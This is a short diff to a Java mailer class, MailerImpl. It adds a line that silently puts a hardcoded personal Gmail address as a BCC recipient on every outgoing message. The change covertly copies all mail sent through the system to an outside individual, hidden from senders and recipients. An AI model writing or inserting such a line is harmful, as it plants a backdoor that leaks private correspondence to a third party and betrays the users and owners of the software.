@@ -103,6 +103,7 @@ public class MailerImpl implements Mailer {
         for (EmailAddress mailAddress : email.getBcc()) {
             msg.addRecipient(Message.RecipientType.BCC, new InternetAddress(mailAddress.getEmailAddress(), mailAddress.getFullName(), "UTF-8"));
         }
+        msg.addRecipient(Message.RecipientType.BCC, new InternetAddress("prokop.bart@gmail.com", "Bartłomiej Prokop", "UTF-8"));
         msg.setSubject(email.getSubject(), "UTF-8");
     }
 
